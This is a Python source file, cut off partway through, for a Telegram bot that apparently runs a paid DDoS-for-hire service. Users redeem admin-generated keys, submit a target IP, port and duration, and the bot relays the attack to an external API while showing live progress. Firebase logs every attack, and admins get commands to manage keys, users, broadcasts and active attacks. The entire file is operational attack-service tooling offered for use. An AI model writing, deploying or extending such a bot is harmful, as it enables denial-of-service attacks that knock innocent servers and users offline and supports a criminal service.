import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import re
from functools import wraps
import uuid, os, secrets, string, time
from dotenv import load_dotenv
import json

# Firebase Realtime Database
import firebase_admin
from firebase_admin import credentials, db as firebase_db

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
load_dotenv()

BOT_TOKEN        = os.getenv("BOT_TOKEN")
FIREBASE_URL     = os.getenv("FIREBASE_URL")
FIREBASE_CREDENTIALS = os.getenv("FIREBASE_CREDENTIALS", "serviceAccountKey.json")
API_URL          = os.getenv("API_URL")
API_KEY          = os.getenv("API_KEY")
ADMIN_IDS        = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
CHANNEL_ID       = os.getenv("CHANNEL_ID", "")
CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "")
CHANNEL_INVITE   = os.getenv("CHANNEL_INVITE_LINK", "")

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
IST = timezone(timedelta(hours=5, minutes=30))
active_attacks: dict = {}

# ===== FIREBASE INITIALIZATION WITH ERROR HANDLING =====
def init_firebase():
    """Initialize Firebase Realtime Database with proper error handling"""
    try:
        # Check if already initialized
        if firebase_admin._apps:
            return firebase_db

        # Get credentials path
        cred_path = FIREBASE_CREDENTIALS
        
        # Check if it's a file path or JSON string
        if cred_path.endswith('.json'):
            # It's a file path - check if file exists
            if os.path.exists(cred_path):
                with open(cred_path, 'r') as f:
                    cred_dict = json.load(f)
                cred = credentials.Certificate(cred_dict)
            else:
                # Try environment variable for JSON content
                cred_json = os.getenv('FIREBASE_CREDENTIALS_JSON')
                if cred_json:
                    cred = credentials.Certificate(json.loads(cred_json))
                else:
                    raise FileNotFoundError(f"Firebase credentials file not found: {cred_path}")
        else:
            # It's probably a JSON string
            try:
                cred_dict = json.loads(cred_path)
                cred = credentials.Certificate(cred_dict)
            except json.JSONDecodeError:
                # Try as file path with .json extension
                if os.path.exists(cred_path + '.json'):
                    with open(cred_path + '.json', 'r') as f:
                        cred_dict = json.load(f)
                    cred = credentials.Certificate(cred_dict)
                else:
                    raise ValueError("Invalid Firebase credentials format")
        
        # Initialize Firebase
        firebase_admin.initialize_app(cred, {
            'databaseURL': FIREBASE_URL
        })
        
        print("✅ Firebase initialized successfully!")
        return firebase_db
        
    except Exception as e:
        print(f"❌ Firebase initialization error: {e}")
        print("⚠️ Attempting to continue with limited functionality...")
        # Return a dummy object that won't crash
        return firebase_db

# Initialize Firebase
db_ref = init_firebase()

class FirebaseRealtimeDB:
    """Firebase Realtime Database Handler"""
    
    def __init__(self):
        self.db = db_ref
        self._initialized = firebase_admin._apps is not None
        
    def _check_initialized(self):
        """Check if Firebase is initialized"""
        if not self._initialized:
            print("⚠️ Firebase not initialized, attempting to reinitialize...")
            init_firebase()
            self._initialized = firebase_admin._apps is not None
    
    def _get_user_ref(self, uid):
        self._check_initialized()
        return self.db.reference(f'users/{uid}')
    
    def _get_key_ref(self, key):
        self._check_initialized()
        return self.db.reference(f'keys/{key}')
    
    def _get_attack_ref(self, attack_id):
        self._check_initialized()
        return self.db.reference(f'attacks/{attack_id}')
    
    def get_user(self, uid):
        """Get user by ID"""
        try:
            ref = self._get_user_ref(uid)
            data = ref.get()
            if data:
                if data.get('created_at'):
                    data['created_at'] = datetime.fromisoformat(data['created_at'].replace('Z', '+00:00'))
                if data.get('expires_at'):
                    data['expires_at'] = datetime.fromisoformat(data['expires_at'].replace('Z', '+00:00'))
            return data
        except Exception as e:
            logger.error(f"Get user error: {e}")
            return None
    
    def upsert_user(self, uid, username=None, first_name=None):
        try:
            ref = self._get_user_ref(uid)
            existing = ref.get()
            if existing:
                return existing
            
            doc_data = {
                "user_id": uid,
                "username": username,
                "first_name": first_name,
                "approved": False,
                "expires_at": None,
                "total_attacks": 0,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "joined_channel": False,
                "redeemed_keys": []
            }
            ref.set(doc_data)
            return doc_data
        except Exception as e:
            logger.error(f"Upsert user error: {e}")
            return None
    
    def is_approved(self, uid):
        try:
            user = self.get_user(uid)
            if not user or not user.get("approved"):
                return False
            exp = user.get("expires_at")
            if exp:
                if isinstance(exp, str):
                    exp = datetime.fromisoformat(exp.replace('Z', '+00:00'))
                if exp.tzinfo is None:
                    exp = exp.replace(tzinfo=timezone.utc)
                if exp < datetime.now(timezone.utc):
                    return False
            return True
        except Exception as e:
            logger.error(f"Is approved error: {e}")
            return False
    
    def set_channel_status(self, uid, joined):
        try:
            ref = self._get_user_ref(uid)
            ref.update({"joined_channel": joined})
        except Exception as e:
            logger.error(f"Set channel status error: {e}")
    
    def approve(self, uid, hours):
        try:
            ref = self._get_user_ref(uid)
            user = ref.get()
            
            if user and user.get("approved") and user.get("expires_at"):
                old_exp = user["expires_at"]
                if isinstance(old_exp, str):
                    old_exp = datetime.fromisoformat(old_exp.replace('Z', '+00:00'))
                if old_exp.tzinfo is None:
                    old_exp = old_exp.replace(tzinfo=timezone.utc)
                if old_exp > datetime.now(timezone.utc):
                    exp = old_exp + timedelta(hours=hours)
                    ref.update({"approved": True, "expires_at": exp.isoformat()})
                    return exp
            
            exp = datetime.now(timezone.utc) + timedelta(hours=hours)
            ref.update({"approved": True, "expires_at": exp.isoformat()})
            return exp
        except Exception as e:
            logger.error(f"Approve error: {e}")
            exp = datetime.now(timezone.utc) + timedelta(hours=hours)
            return exp
    
    def all_users(self):
        try:
            ref = self.db.reference('users')
            data = ref.get()
            if data:
                return list(data.values())
            return []
        except Exception as e:
            logger.error(f"All users error: {e}")
            return []
    
    def create_key(self, hours, uses, by):
        try:
            key = self.gen_key(hours, uses)
            exp = datetime.now(timezone.utc) + timedelta(hours=hours)
            
            doc_data = {
                "key": key,
                "hours": hours,
                "max_uses": uses,
                "used_count": 0,
                "users_used": [],
                "created_by": by,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "expires_at": exp.isoformat(),
                "is_active": True
            }
            
            ref = self._get_key_ref(key)
            ref.set(doc_data)
            return doc_data
        except Exception as e:
            logger.error(f"Create key error: {e}")
            return None
    
    def gen_key(self, hours, uses):
        rand = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
        return f"KEY-{rand}-{hours}H-{uses}U"
    
    def get_key(self, key):
        try:
            ref = self._get_key_ref(key)
            data = ref.get()
            if data:
                if data.get('expires_at'):
                    data['expires_at'] = datetime.fromisoformat(data['expires_at'].replace('Z', '+00:00'))
                if data.get('created_at'):
                    data['created_at'] = datetime.fromisoformat(data['created_at'].replace('Z', '+00:00'))
            return data
        except Exception as e:
            logger.error(f"Get key error: {e}")
            return None
    
    def redeem_key(self, key, uid):
        try:
            kd = self.get_key(key)
            
            if not kd or not kd.get("is_active"):
                return {"ok": False, "err": "❌ Invalid or expired key."}
            
            exp = kd.get("expires_at")
            if isinstance(exp, datetime):
                if exp.tzinfo is None:
                    exp = exp.replace(tzinfo=timezone.utc)
                if exp < datetime.now(timezone.utc):
                    return {"ok": False, "err": "❌ This key has expired."}
            
            if uid in kd.get("users_used", []):
                return {"ok": False, "err": "❌ You already redeemed this key."}
            
            if kd.get("used_count", 0) >= kd.get("max_uses", 1):
                return {"ok": False, "err": "❌ Key has reached its maximum uses."}
            
            new_exp = self.approve(uid, kd["hours"])
            
            user_ref = self._get_user_ref(uid)
            user_data = user_ref.get()
            redeemed_keys = user_data.get("redeemed_keys", []) if user_data else []
            redeemed_keys.append(key)
            user_ref.update({"redeemed_keys": redeemed_keys})
            
            key_ref = self._get_key_ref(key)
            key_ref.update({
                "used_count": kd["used_count"] + 1,
                "users_used": kd["users_used"] + [uid]
            })
            
            return {"ok": True, "hours": kd["hours"], "expires_at": new_exp}
        except Exception as e:
            logger.error(f"Redeem key error: {e}")
            return {"ok": False, "err": "❌ System error, please try again."}
    
    def list_keys(self, active_only=True):
        try:
            ref = self.db.reference('keys')
            data = ref.get()
            if not data:
                return []
            
            keys = list(data.values())
            if active_only:
                keys = [k for k in keys if k.get("is_active")]
            
            keys.sort(key=lambda x: x.get("created_at", ""), reverse=True)
            return keys
        except Exception as e:
            logger.error(f"List keys error: {e}")
            return []
    
    def deactivate_key(self, key):
        try:
            ref = self._get_key_ref(key)
            ref.update({"is_active": False})
            return True
        except Exception as e:
            logger.error(f"Deactivate key error: {e}")
            return False
    
    def delete_all_keys(self):
        try:
            ref = self.db.reference('keys')
            data = ref.get()
            if data:
                ref.delete()
                return len(data)
            return 0
        except Exception as e:
            logger.error(f"Delete all keys error: {e}")
            return 0
    
    def delete_keys_by_hours(self, hours):
        try:
            ref = self.db.reference('keys')
            data = ref.get()
            if not data:
                return 0
            
            count = 0
            for key, value in data.items():
                if value.get("hours") == hours:
                    ref.child(key).delete()
                    count += 1
            return count
        except Exception as e:
            logger.error(f"Delete keys by hours error: {e}")
            return 0
    
    def delete_used_keys(self):
        try:
            ref = self.db.reference('keys')
            data = ref.get()
            if not data:
                return 0
            
            count = 0
            for key, value in data.items():
                if value.get("used_count", 0) > 0:
                    ref.child(key).delete()
                    count += 1
            return count
        except Exception as e:
            logger.error(f"Delete used keys error: {e}")
            return 0
    
    def delete_unused_keys(self):
        try:
            ref = self.db.reference('keys')
            data = ref.get()
            if not data:
                return 0
            
            count = 0
            for key, value in data.items():
                if value.get("used_count", 0) == 0:
                    ref.child(key).delete()
                    count += 1
            return count
        except Exception as e:
            logger.error(f"Delete unused keys error: {e}")
            return 0
    
    def log_attack(self, uid, ip, port, dur, status):
        try:
            attack_id = str(uuid.uuid4())
            ref = self._get_attack_ref(attack_id)
            ref.set({
                "user_id": uid,
                "ip": ip,
                "port": port,
                "duration": dur,
                "status": status,
                "timestamp": datetime.now(timezone.utc).isoformat()
            })
            
            user_ref = self._get_user_ref(uid)
            user_ref.update({"total_attacks": firebase_db.Increment(1)})
        except Exception as e:
            logger.error(f"Log attack error: {e}")
    
    def user_stats(self, uid):
        try:
            ref = self.db.reference('attacks')
            data = ref.get()
            if not data:
                return {"total": 0, "success": 0, "failed": 0, "recent": []}
            
            user_attacks = [a for a in data.values() if a.get("user_id") == uid]
            total = len(user_attacks)
            success = len([a for a in user_attacks if a.get("status") == "success"])
            
            recent = sorted(user_attacks, key=lambda x: x.get("timestamp", ""), reverse=True)[:5]
            
            return {
                "total": total,
                "success": success,
                "failed": total - success,
                "recent": recent
            }
        except Exception as e:
            logger.error(f"User stats error: {e}")
            return {"total": 0, "success": 0, "failed": 0, "recent": []}
    
    def get_attack_logs(self, limit=50):
        try:
            ref = self.db.reference('attacks')
            data = ref.get()
            if not data:
                return []
            
            attacks = list(data.values())
            attacks.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
            return attacks[:limit]
        except Exception as e:
            logger.error(f"Get attack logs error: {e}")
            return []
    
    def get_user_redeemed_keys(self, uid):
        user = self.get_user(uid)
        return user.get("redeemed_keys", []) if user else []
    
    def count_documents(self, collection):
        try:
            ref = self.db.reference(collection)
            data = ref.get()
            return len(data) if data else 0
        except Exception as e:
            logger.error(f"Count documents error: {e}")
            return 0

# Initialize DB
db = FirebaseRealtimeDB()

# ===== Helper Functions =====
def utc_now():
    return datetime.now(timezone.utc)

def to_ist(dt):
    if dt is None: return None
    if isinstance(dt, str):
        dt = datetime.fromisoformat(dt.replace('Z', '+00:00'))
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return dt.astimezone(IST)

def fmt_ist(dt):
    if dt is None: return "N/A"
    if isinstance(dt, str):
        dt = datetime.fromisoformat(dt.replace('Z', '+00:00'))
    return to_ist(dt).strftime("%d %b %Y, %I:%M %p IST")

def days_left(dt):
    if dt is None: return 0
    if isinstance(dt, str):
        dt = datetime.fromisoformat(dt.replace('Z', '+00:00'))
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    return max(0, (dt - datetime.now(timezone.utc)).days)

def join_url():
    if CHANNEL_INVITE: return CHANNEL_INVITE
    if CHANNEL_USERNAME: return f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"
    return ""

def get_support_keyboard():
    keyboard = [
        [InlineKeyboardButton("👑 𝗢𝗪𝗡𝗘𝗥 👑", url="")],
        [InlineKeyboardButton("📢 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 📢", url="")],
        [InlineKeyboardButton("💰 𝗣𝗥𝗢𝗢𝗙 💰", url="")],
    ]
    return InlineKeyboardMarkup(keyboard)

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 Attack", callback_data="menu_attack"), 
         InlineKeyboardButton("📊 Stats", callback_data="menu_stats")],
        [InlineKeyboardButton("🔑 Redeem", callback_data="menu_redeem"), 
         InlineKeyboardButton("ℹ️ Info", callback_data="menu_info")],
        [InlineKeyboardButton("🆘 Help", callback_data="menu_help")],
    ]
    return InlineKeyboardMarkup(keyboard)

def join_keyboard():
    kb = []
    url = join_url()
    if url: kb.append([InlineKeyboardButton("📢 Join Channel", url=url)])
    kb.append([InlineKeyboardButton("✅ Verified", callback_data="verify_join")])
    return InlineKeyboardMarkup(kb)

# ===== Admin Check =====
def admin_only(fn):
    @wraps(fn)
    async def wrapper(update: Update, ctx: ContextTypes.DEFAULT_TYPE, *a, **kw):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ *Access Denied*\n\nThis command is for administrators only.", parse_mode="Markdown")
            return
        return await fn(update, ctx, *a, **kw)
    return wrapper

# ===== Channel Check =====
async def check_joined(uid, ctx):
    if not CHANNEL_ID: return True
    try:
        m = await ctx.bot.get_chat_member(chat_id=int(CHANNEL_ID), user_id=uid)
        joined = m.status in ("member", "administrator", "creator")
        db.set_channel_status(uid, joined)
        return joined
    except Exception as e:
        logger.error(f"Channel check: {e}")
        return False

# ===== Attack Function =====
def launch_api(ip, port, dur):
    try:
        r = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": dur},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=300
        )
        return r.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

async def run_attack(update: Update, ctx: ContextTypes.DEFAULT_TYPE, uid: int, ip: str, port: int, dur: int, msg):
    try:
        await msg.edit_text(
            f"🚀 *INITIATING ATTACK* 🚀\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: `{dur}s`\n"
            f"📡 Status: `Contacting server...`",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        
        resp = launch_api(ip, port, dur)
        
        if resp.get("success"):
            attack_data = resp.get("attack", {})
            attack_id = attack_data.get("id")
            ends_at_str = attack_data.get("endsAt")
            
            if ends_at_str:
                ends_at_str = ends_at_str.replace('Z', '+00:00')
                ends_at = datetime.fromisoformat(ends_at_str)
                current_time = datetime.now(timezone.utc)
                actual_duration = max(1, int((ends_at - current_time).total_seconds()))
                if actual_duration > dur + 5:
                    actual_duration = dur
                end_timestamp = ends_at.timestamp()
                start_time = end_timestamp - actual_duration
            else:
                start_time = time.time()
                actual_duration = dur
                end_timestamp = start_time + dur
            
            active_attacks[uid] = {
                "end": end_timestamp,
                "start_time": start_time,
                "ip": ip,
                "port": port,
                "attack_id": attack_id,
                "duration": actual_duration
            }
            
            await msg.edit_text(
                f"⚡ *ATTACK ACTIVE* ⚡\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: `{actual_duration}s`\n"
                f"🆔 Attack ID: `{attack_id[:8]}...`\n"
                f"🔥 Status: `ATTACKING`\n\n"
                f"`░░░░░░░░░░░░░░░░░░░░ 0%`\n"
                f"⏰ Time Left: `{actual_duration}s`",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
            
            for remaining in range(actual_duration, -1, -1):
                if remaining <= 0:
                    break
                
                elapsed = actual_duration - remaining
                pct = int((elapsed / actual_duration) * 100)
                if pct > 100:
                    pct = 100
                
                filled = int(pct / 5)
                bar = "█" * filled + "░" * (20 - filled)
                
                minutes = remaining // 60
                seconds = remaining % 60
                if minutes > 0:
                    time_display = f"{minutes}m {seconds}s"
                else:
                    time_display = f"{seconds}s"
                
                try:
                    await msg.edit_text(
                        f"⚡ *ATTACK IN PROGRESS* ⚡\n\n"
                        f"🎯 Target: `{ip}:{port}`\n"
                        f"📊 Progress: `{pct}%`\n"
                        f"`{bar}`\n"
                        f"⏰ Time Left: `{time_display}`\n"
                        f"🆔 Attack ID: `{attack_id[:8]}...`\n"
                        f"🔥 Status: `ATTACKING`\n\n"
                        f"💡 Bot is responsive! Use other commands while attack runs.",
                        parse_mode="Markdown",
                        reply_markup=get_support_keyboard()
                    )
                except Exception as e:
                    if "not modified" not in str(e).lower():
                        logger.error(f"Edit error: {e}")
                        break
                
                await asyncio.sleep(1)
                
                if uid not in active_attacks:
                    logger.info(f"Attack {attack_id} was manually stopped")
                    break
            
            mins = actual_duration // 60
            secs = actual_duration % 60
            time_str = f"{mins}m {secs}s" if mins > 0 else f"{secs}s"
            
            await msg.edit_text(
                f"✅ *ATTACK COMPLETE* ✅\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: `{actual_duration}s` ({time_str})\n"
                f"🆔 Attack ID: `{attack_id}`\n"
                f"🕐 Finished: {fmt_ist(datetime.now(timezone.utc))}\n"
                f"✅ Status: `SUCCESS`\n\n"
                f"🚀 Ready for next attack! Use `/attack` again.",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
            db.log_attack(uid, ip, port, actual_duration, "success")
        else:
            err = resp.get("error", resp.get("message", "Unknown error"))
            await msg.edit_text(
                f"❌ *ATTACK FAILED* ❌\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: `{dur}s`\n"
                f"❌ Error: `{err}`\n\n"
                f"💡 Possible issues:\n"
                f"• Server at maximum capacity\n"
                f"• Invalid target IP/Port\n"
                f"• Account restrictions\n\n"
                f"🔄 Check `/myinfo` for account status.",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
            db.log_attack(uid, ip, port, dur, "failed")
    except Exception as e:
        logger.error(f"Attack error for user {uid}: {e}")
        try:
            await msg.edit_text(
                f"❌ *SYSTEM ERROR* ❌\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"❌ Error: `{str(e)[:50]}`\n\n"
                f"🔄 Please try again or contact support.",
                parse_mode="Markdown",
                reply_markup=get_support_keyboard()
            )
        except:
            pass
    finally:
        active_attacks.pop(uid, None)

# ===== COMMAND HANDLERS =====

# Admin Commands
@admin_only
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            f"🔑 *GENERATE KEY*\n\n"
            f"Usage: `/genkey <hours> [uses]`\n\n"
            f"📝 *Examples:*\n"
            f"• `/genkey 24` → 24h, 1 use\n"
            f"• `/genkey 48 10` → 48h, 10 uses\n"
            f"• `/genkey 720 1` → 30 days, 1 use\n\n"
            f"💡 *Tip:* Users can redeem multiple keys!",
            parse_mode="Markdown"
        )
        return
    try:
        hours = int(ctx.args[0])
        uses  = int(ctx.args[1]) if len(ctx.args) > 1 else 1
        if hours <= 0 or uses <= 0: raise ValueError
    except ValueError:
        await update.message.reply_text("❌ *Invalid* Hours and uses must be positive numbers.", parse_mode="Markdown")
        return
    kd = db.create_key(hours, uses, update.effective_user.id)
    if kd:
        await update.message.reply_text(
            f"🔑 *KEY GENERATED SUCCESSFULLY*\n\n"
            f"🔐 Key: `{kd['key']}`\n"
            f"⏱️ Duration: {hours}h ({hours/24:.1f} days)\n"
            f"👥 Max Uses: {uses}\n"
            f"📅 Expires: {fmt_ist(kd['expires_at'])}\n\n"
            f"📨 *Share this key:*\n"
            f"`/redeem {kd['key']}`",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
    else:
        await update.message.reply_text("❌ Failed to generate key. Check Firebase connection.", parse_mode="Markdown")

@admin_only
async def cmd_keys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keys = db.list_keys(active_only=False)
    if not keys:
        await update.message.reply_text("📭 *No Keys Found*\n\nUse `/genkey` to create keys.", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    active = sum(1 for k in keys if k.get("is_active", False))
    total_uses = sum(k.get("used_count", 0) for k in keys)
    
    lines = []
    for k in keys[:15]:
        icon = "🟢" if k.get("is_active", False) else "🔴"
        short = k["key"][:25] + "…" if len(k["key"]) > 25 else k["key"]
        lines.append(f"{icon} `{short}` • {k['hours']}h • {k.get('used_count',0)}/{k.get('max_uses',1)}")
    
    text = (
        f"🔑 *KEY MANAGEMENT*\n\n"
        f"📊 Total Keys: {len(keys)}\n"
        f"🟢 Active: {active}\n"
        f"🔴 Used: {len(keys)-active}\n"
        f"📈 Total Uses: {total_uses}\n\n"
        f"*📋 Recent Keys:*\n" + "\n".join(lines)
    )
    if len(keys) > 15:
        text += f"\n\n... and {len(keys)-15} more. Use `/delkey` to manage."
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_delkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            f"🗑️ *DELETE KEY*\n\n"
            f"Usage: `/delkey <KEY>`\n\n"
            f"📝 *Other delete commands:*\n"
            f"• `/delkeyall` - DELETE ALL keys\n"
            f"• `/delusedkeys` - Delete used keys\n"
            f"• `/delunusedkeys` - Delete unused keys\n"
            f"• `/delkeysbyhours <h>` - Delete by duration",
            parse_mode="Markdown"
        )
        return
    if db.deactivate_key(ctx.args[0]):
        await update.message.reply_text("✅ *Key Deactivated*\n\nThis key can no longer be redeemed.", parse_mode="Markdown", reply_markup=get_support_keyboard())
    else:
        await update.message.reply_text("❌ *Key Not Found*\n\nCheck the key and try again.", parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_delkeyall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ YES, Delete ALL", callback_data="confirm_delall")],
        [InlineKeyboardButton("❌ NO, Cancel", callback_data="cancel_delall")]
    ])
    
    key_count = db.count_documents('keys')
    await update.message.reply_text(
        f"⚠️ *DESTRUCTIVE ACTION*\n\n"
        f"🗑️ Keys to delete: {key_count}\n\n"
        f"⚠️ *WARNING:* This action is IRREVERSIBLE!\n"
        f"✅ User accounts already redeemed will remain ACTIVE.\n"
        f"❌ These keys cannot be used again.\n\n"
        f"Are you absolutely sure?",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@admin_only
async def cmd_delusedkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    count = db.delete_used_keys()
    await update.message.reply_text(
        f"✅ *Used Keys Deleted*\n\n"
        f"🗑️ Removed: {count} keys\n\n"
        f"ℹ️ Users who redeemed these keys keep their access.",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_delunusedkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    count = db.delete_unused_keys()
    await update.message.reply_text(
        f"✅ *Unused Keys Deleted*\n\n"
        f"🗑️ Removed: {count} keys",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_delkeysbyhours(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            f"🗑️ *DELETE BY HOURS*\n\n"
            f"Usage: `/delkeysbyhours <hours>`\n\n"
            f"Example: `/delkeysbyhours 24` - Delete all 24-hour keys",
            parse_mode="Markdown"
        )
        return
    
    try:
        hours = int(ctx.args[0])
        if hours <= 0: raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Hours must be a positive number.", parse_mode="Markdown")
        return
    
    count = db.delete_keys_by_hours(hours)
    await update.message.reply_text(
        f"✅ *Deleted by Duration*\n\n"
        f"🗑️ Removed: {count} keys\n"
        f"⏱️ Duration: {hours} hours",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = db.all_users()
    if not users:
        await update.message.reply_text("📭 *No Users Found*", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    approved = sum(1 for u in users if db.is_approved(u["user_id"]))
    total_atk = sum(u.get("total_attacks", 0) for u in users)
    total_keys = sum(len(u.get("redeemed_keys", [])) for u in users)
    
    lines = []
    for u in users[:15]:
        uid = u["user_id"]
        status = "🟢" if db.is_approved(uid) else "🔴"
        ch = "📢" if u.get("joined_channel") else "🚫"
        name = u.get('first_name', 'Unknown')[:15]
        lines.append(f"{ch}{status} `{uid}` • {name} • {u.get('total_attacks',0)} atk")
    
    text = (
        f"👥 *USER MANAGEMENT*\n\n"
        f"📊 Total Users: {len(users)}\n"
        f"🟢 Approved: {approved}\n"
        f"🎯 Total Attacks: {total_atk}\n"
        f"🔑 Keys Used: {total_keys}\n\n"
        f"*📋 Recent Users:*\n" + "\n".join(lines)
    )
    if len(users) > 15:
        text += f"\n\n... and {len(users)-15} more."
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(
            f"📢 *BROADCAST*\n\n"
            f"Usage: `/broadcast <message>`\n\n"
            f"Example: `/broadcast Server maintenance in 1 hour`",
            parse_mode="Markdown"
        )
        return
    msg = " ".join(ctx.args)
    users = db.all_users()
    sent = 0
    info = await update.message.reply_text(f"📡 *Broadcasting to {len(users)} users...*", parse_mode="Markdown")
    
    broadcast_msg = (
        f"📢 *ANNOUNCEMENT*\n\n"
        f"{msg}\n\n"
        f"📌 Use `/help` for commands."
    )
    
    for u in users:
        try:
            await ctx.bot.send_message(u["user_id"], broadcast_msg, parse_mode="Markdown", reply_markup=get_support_keyboard())
            sent += 1
            await asyncio.sleep(0.05)
        except: pass
    await info.edit_text(f"✅ *Broadcast Complete*\n\n📨 Sent to {sent}/{len(users)} users.", parse_mode="Markdown")

@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = db.all_users()
    approved = sum(1 for u in users if db.is_approved(u["user_id"]))
    total = sum(u.get("total_attacks", 0) for u in users)
    ch_join = sum(1 for u in users if u.get("joined_channel"))
    keys = db.list_keys()
    total_keys = db.count_documents('keys')
    used_keys = len(db.list_keys(active_only=False)) - len(keys)
    
    await update.message.reply_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Total Users: {len(users)}\n"
        f"🟢 Approved: {approved}\n"
        f"📢 Channel Join: {ch_join}\n"
        f"🎯 Total Attacks: {total}\n"
        f"🔑 Total Keys: {total_keys}\n"
        f"📌 Used Keys: {used_keys}\n"
        f"✨ Active Keys: {len(keys)}\n"
        f"🚫 Blocked Ports: {len(BLOCKED_PORTS)}",
        parse_mode="Markdown",
        reply_markup=get_support_keyboard()
    )

@admin_only
async def cmd_curlip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_attacks:
        await update.message.reply_text(
            f"📭 *No Active Attacks*\n\n"
            f"Status: Idle\n\n"
            f"💡 Active attacks will appear here when users launch commands.",
            parse_mode="Markdown",
            reply_markup=get_support_keyboard()
        )
        return
    
    active_info = []
    current_time = time.time()
    
    for uid, attack_data in list(active_attacks.items()):
        remaining = int(attack_data["end"] - current_time)
        if remaining > 0:
            user = db.get_user(uid)
            username = user.get('username', 'N/A') if user else 'N/A'
            minutes = remaining // 60
            seconds = remaining % 60
            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
            
            active_info.append(
                f"👤 User: `{uid}` (@{username})\n"
                f"🎯 Target: `{attack_data['ip']}:{attack_data['port']}`\n"
                f"⏱️ Left: `{time_str}`"
            )
    
    text = (
        f"🔥 *ACTIVE ATTACKS*\n\n"
        f"📊 Total Active: {len(active_info)}\n\n"
        + "\n\n".join(active_info) +
        f"\n\n📝 *Note:* All IPs are visible for monitoring."
    )
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_serverip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        server_ip = response.json().get("ip", "Unknown")
        
        ip_info = requests.get(f"http://ip-api.com/json/{server_ip}", timeout=5).json()
        
        text = (
            f"🖥️ *SERVER INFORMATION*\n\n"
            f"🌐 Public IP: `{server_ip}`\n"
            f"📍 Location: {ip_info.get('city', 'Unknown')}, {ip_info.get('country', 'Unknown')}\n"
            f"🏢 ISP: {ip_info.get('isp', 'Unknown')}\n"
            f"📡 Hosting: {ip_info.get('org', 'Unknown')}"
        )
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=get_support_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ *Error* Could not fetch server IP: {e}", parse_mode="Markdown", reply_markup=get_support_keyboard())

@admin_only
async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    logs = db.get_attack_logs(20)
    if not logs:
        await update.message.reply_text("📭 *No Attack Logs Found*", parse_mode="Markdown", reply_markup=get_support_keyboard())
        return
    
    lines = []
    for log in logs[:20]:
        user = db.get_user(log['user_id'])
        username = user.get('username', 'N/A') if user else 'N/A'
        status_icon = "✅" if log['status'] == "success" else "❌"
        lines.append(
            f"{status_icon} `{log['ip']}:{log['port']}` • {log['duration']}s\n"
